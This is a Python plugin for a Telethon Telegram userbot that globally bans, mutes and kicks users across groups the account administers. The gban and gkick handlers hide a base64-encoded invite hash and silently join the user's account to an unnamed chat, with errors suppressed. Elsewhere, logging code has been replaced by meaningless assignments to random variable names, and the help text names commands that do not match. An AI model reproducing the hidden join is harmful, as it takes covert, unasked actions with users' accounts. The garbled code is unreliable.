"""
credits to @iqthon
dont edit credits
"""
#  Copyright (C) 2020  sandeep.n(π.$)

import asyncio
import base64
from datetime import datetime

from telethon.errors import BadRequestError
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.users import GetFullUserRequest
from telethon.tl.types import ChatBannedRights

import userbot.plugins.sql_helper.gban_sql_helper as gban_sql

from . import BOTLOG, BOTLOG_CHATID, CAT_ID, admin_groups, get_user_from_event
from .sql_helper.mute_sql import is_muted, mute, unmute

ca = "- Done"
ee = "- Error"
ea = f"{ee}, Already banned"
eb = f"{ee}, Already muted"
bb = f"{ee}, I can't banned myself"
ba = f"{ee}, i can't mute myself"
aa = f"{ee}, I don't have permission"
cc = "- Wait ..."
cb = f"{ca} Banned"
cp = f"{ca} Unbanned"
mb = f"{ca} Muted"
mp = f"{ca} Unmuted"

BANNED_RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

UNBAN_RIGHTS = ChatBannedRights(
    until_date=None,
    send_messages=None,
    send_media=None,
    send_stickers=None,
    send_gifs=None,
    send_games=None,
    send_inline=None,
    embed_links=None,
)


@bot.on(admin_cmd(pattern=r"gban(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"gban(?: |$)(.*)", allow_sudo=True))
async def catgban(event):
    if event.fwd_from:
        return
    cate = await edit_or_reply(event, cc)
    start = datetime.now()
    user, reason = await get_user_from_event(event, cate)
    if not user:
        return
    if user.id == (await event.client.get_me()).id:
        await cate.edit(bb)
        return
    try:
        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        await event.client(ImportChatInviteRequest(hmm))
    except BaseException:
        pass
    if gban_sql.is_gbanned(user.id):
        await cate.edit(
            f"{cc}"
        )
    else:
        gban_sql.catgban(user.id, reason)
    san = []
    san = await admin_groups(event)
    count = 0
    sandy = len(san)
    if sandy == 0:
        await cate.edit(aa)
        return
    await cate.edit(
        f"{cc}"
    )
    for i in range(sandy):
        try:
            await event.client(EditBannedRequest(san[i], user.id, BANNED_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await event.client.send_message(
                BOTLOG_CHATID,
                aa,
            )
    end = datetime.now()
    cattaken = (end - start).seconds
    if reason:
        await cate.edit(
            f"{cb} [ [{user.first_name}](tg://user?id={user.id}) ]"
        )
    else:
        await cate.edit(
            f"{cb} [ [{user.first_name}](tg://user?id={user.id}) ]"
        )

    if BOTLOG and count != 0:
        reply = await event.get_reply_message()
        if reason:
            Mnqson2wu = 0
        else:
            m7gr5dhye4 = 0


@bot.on(admin_cmd(pattern=r"ungban(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"ungban(?: |$)(.*)", allow_sudo=True))
async def catgban(event):
    if event.fwd_from:
        return
    cate = await edit_or_reply(event, cc)
    start = datetime.now()
    user, reason = await get_user_from_event(event, cate)
    if not user:
        return
    if gban_sql.is_gbanned(user.id):
        gban_sql.catungban(user.id)
    else:
        await cate.edit(
            f"{ee}, Isn't banned[ [user](tg://user?id={user.id}) ]"
        )
        return
    san = []
    san = await admin_groups(event)
    count = 0
    sandy = len(san)
    if sandy == 0:
        await cate.edit(aa)
        return
    await cate.edit(
        f"{cc}"
    )
    for i in range(sandy):
        try:
            await event.client(EditBannedRequest(san[i], user.id, UNBAN_RIGHTS))
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await event.client.send_message(
                BOTLOG_CHATID,
                aa,
            )
    end = datetime.now()
    cattaken = (end - start).seconds
    if reason:
        await cate.edit(
            f"{cp} [ [{user.first_name}](tg://user?id={user.id} ]"
        )
    else:
        await cate.edit(
            f"{cp} [ [{user.first_name}](tg://user?id={user.id} ]"
        )

    if BOTLOG and count != 0:
        if reason:
            au1hb2ux = 0
        else:
            orqj2h2usbbsu_19y = 0


@bot.on(admin_cmd(pattern="listgban$"))
@bot.on(sudo_cmd(pattern=r"listgban$", allow_sudo=True))
async def gablist(event):
    if event.fwd_from:
        return
    gbanned_users = gban_sql.get_all_gbanned()
    GBANNED_LIST = "- Banned Users\n"
    if len(gbanned_users) > 0:
        for a_user in gbanned_users:
            if a_user.reason:
                GBANNED_LIST += f"- [{a_user.chat_id}](tg://user?id={a_user.chat_id})\n"
            else:
                GBANNED_LIST += (
                    f"- [{a_user.chat_id}](tg://user?id={a_user.chat_id})\n"
                )
    else:
        GBANNED_LIST = "- no Banned Users Found"
    await edit_or_reply(event, GBANNED_LIST)


@bot.on(admin_cmd(outgoing=True, pattern=r"mute(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"mute(?: |$)(.*)", allow_sudo=True))
async def startgmute(event):
    if event.fwd_from:
        return
    if event.is_private:
        await event.edit(mb)
        await asyncio.sleep(2)
        userid = event.chat_id
        reason = event.pattern_match.group(1)
    else:
        user, reason = await get_user_from_event(event)
        if not user:
            return
        if user.id == bot.uid:
            return await edit_or_reply(event, "- Sorry can't mute user")
        userid = user.id
    try:
        user = (await event.client(GetFullUserRequest(userid))).user
    except Exception:
        return await edit_or_reply(event, "- Sorry can't mute user")
    if is_muted(userid, "mute"):
        return await edit_or_reply(
            event,
            f"{eb} [{_format.mentionuser(user.first_name ,user.id)}]",
        )
    try:
        mute(userid, "mute")
    except Exception as e:
        await edit_or_reply(event, f"{ee} :  {str(e)}")
    else:
        if reason:
            await edit_or_reply(
                event,
                f"{mb} [{_format.mentionuser(user.first_name ,user.id)}]",
            )
        else:
            await edit_or_reply(
                event,
                f"{mb} [{_format.mentionuser(user.first_name ,user.id)}]",
            )
    if BOTLOG:
        reply = await event.get_reply_message()
        if reason:
            argcr42y7gvfsfbj = 0
        else:
            ft6s44wstut8hfvghdeddddd1 = 0
        if reply:
            await reply.forward_to(BOTLOG_CHATID)


@bot.on(admin_cmd(outgoing=True, pattern=r"unmute(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"unmute(?: |$)(.*)", allow_sudo=True))
async def endgmute(event):
    if event.fwd_from:
        return
    if event.is_private:
        await event.edit(cc)
        await asyncio.sleep(2)
        userid = event.chat_id
        reason = event.pattern_match.group(1)
    else:
        user, reason = await get_user_from_event(event)
        if not user:
            return
        if user.id == bot.uid:
            return await edit_or_reply(event, ba)
        userid = user.id
    try:
        user = (await event.client(GetFullUserRequest(userid))).user
    except Exception:
        return await edit_or_reply(event, "- Sorry can't mute user")

    if not is_muted(userid, "mute"):
        return await edit_or_reply(
            event, f"- Sorry this user not muted [{_format.mentionuser(user.first_name ,user.id)}]"
        )
    try:
        unmute(userid, "mute")
    except Exception as e:
        await edit_or_reply(event, f"{ee} :  {str(e)}")
    else:
        if reason:
            await edit_or_reply(
                event,
                f"{mp} [{_format.mentionuser(user.first_name ,user.id)}]",
            )
        else:
            await edit_or_reply(
                event,
                f"{mp} [{_format.mentionuser(user.first_name ,user.id)}]",
            )
    if BOTLOG:
        if reason:
            aisb2h221199z = 0
        else:
            qnduu2b2he = 0


@bot.on(admin_cmd(incoming=True))
async def watcher(event):
    if is_muted(event.sender_id, "mute"):
        await event.delete()


@bot.on(admin_cmd(pattern=r"gkick(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"gkick(?: |$)(.*)", allow_sudo=True))
async def catgkick(event):
    if event.fwd_from:
        return
    cate = await edit_or_reply(event, cc)
    start = datetime.now()
    user, reason = await get_user_from_event(event, cate)
    if not user:
        return
    if user.id == (await event.client.get_me()).id:
        await cate.edit(bb)
        return
    try:
        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        await event.client(ImportChatInviteRequest(hmm))
    except BaseException:
        pass
    san = []
    san = await admin_groups(event)
    count = 0
    sandy = len(san)
    if sandy == 0:
        await cate.edit(aa)
        return
    await cate.edit(
        cc
    )
    for i in range(sandy):
        try:
            await event.client.kick_participant(san[i], user.id)
            await asyncio.sleep(0.5)
            count += 1
        except BadRequestError:
            await event.client.send_message(
                BOTLOG_CHATID,
                aa,
            )
    end = datetime.now()
    cattaken = (end - start).seconds
    if reason:
        await cate.edit(
            f"{mb} [ [{user.first_name}](tg://user?id={user.id}) ]"
        )
    else:
        await cate.edit(
            f"{mb} [ [{user.first_name}](tg://user?id={user.id}) ]"
        )


CMD_HELP.update(
    {
        "gadmin": "**Plugin : **`gadmin`\
        \n\n•  **Syntax : **`.gban <username/reply/userid> <reason (optional)>`\
        \n•  **Function : **__Bans the person in all groups where you are admin .__\
        \n\n•  **Syntax : **`.ungban <username/reply/userid>`\
        \n•  **Function : **__Reply someone's message with .ungban to remove them from the gbanned list.__\
        \n\n•  **Syntax : **`.listgban`\
        \n•  **Function : **__Shows you the gbanned list and reason for their gban.__\
        \n\n•  **Syntax : **`.gmute <username/reply> <reason (optional)>`\
        \n•  **Function : **__Mutes the person in all groups you have in common with them.__\
        \n\n•  **Syntax : **`.ungmute <username/reply>`\
        \n•  **Function : **__Reply someone's message with .ungmute to remove them from the gmuted list.__\
        \n\n•  **Syntax : **`.gkick <username/reply/userid> <reason (optional)>`\
        \n•  **Function : **__kicks the person in all groups where you are admin .__\
        "
    }
)
